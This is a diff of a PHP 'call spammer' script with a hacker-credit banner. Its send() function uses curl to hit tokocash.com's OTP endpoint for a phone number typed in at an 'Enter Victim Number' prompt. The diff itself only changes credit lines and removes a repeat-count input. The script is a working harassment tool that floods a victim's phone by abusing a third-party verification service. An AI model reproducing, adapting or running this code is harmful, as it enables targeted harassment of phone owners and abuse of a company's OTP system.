@@ -7,7 +7,7 @@ print "\n\n \033[93m
  IIIII                                      IIIII
  IIIII ----------- CALL SPAMMER ----------- IIIII
  IIIII                                      IIIII
- IIIII          CODED BY MR.R4MZz           IIIII
+ IIIII           CODED BY MR.R4MZ           IIIII
  IIIII                                      IIIII
  IIIII                                      IIIII
  IIIII          THANKS TO MR.TENWAP         IIIII
@@ -16,8 +16,8 @@ print "\n\n \033[93m
  IIIIIIIIIIIIIII                  IIIIIIIIIIIIIII
  IIIIIIIIIIIIIII                  IIIIIIIIIIIIIII
  ------------------------------------------------
-\n\n\n";
-$jumlah = trim(fgets(STDIN));
+\n\n";
+
 	function send($phone){
         $cs = curl_init();
         curl_setopt($cs, CURLOPT_URL,"https://www.tokocash.com/oauth/otp");                      
@@ -31,7 +31,6 @@ $jumlah = trim(fgets(STDIN));
         curl_close($cs);
                 echo $result."\n";
 }
-echo "TOOLS BY ; KH4L3D\n\n";
 echo "\033[92m Enter Victim Number ==> ";
 $nomor = trim(fgets(STDIN));
 $execute = send($nomor);
